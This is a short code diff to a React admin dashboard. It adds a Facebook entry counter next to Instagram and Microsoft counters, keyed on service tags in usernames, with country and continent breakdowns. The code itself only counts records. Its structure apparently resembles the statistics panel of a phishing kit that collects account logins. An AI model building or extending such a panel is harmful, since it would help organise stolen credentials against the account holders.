@@ -18,6 +18,7 @@ export default function AdminDashboard() {
     totalEntries: 0,
     instagramEntries: 0,
     microsoftEntries: 0,
+    facebookEntries: 0,
     countries: {},
     continents: {}
   });
@@ -123,6 +124,7 @@ export default function AdminDashboard() {
       totalEntries: data.length,
       instagramEntries: data.filter(item => item.username.includes('(IG)')).length,
       microsoftEntries: data.filter(item => item.username.includes('(hotmail)') || item.username.includes('(MS)')).length,
+      facebookEntries: data.filter(item => item.username.includes('(FB)')).length,
       countries: {},
       continents: {}
     };
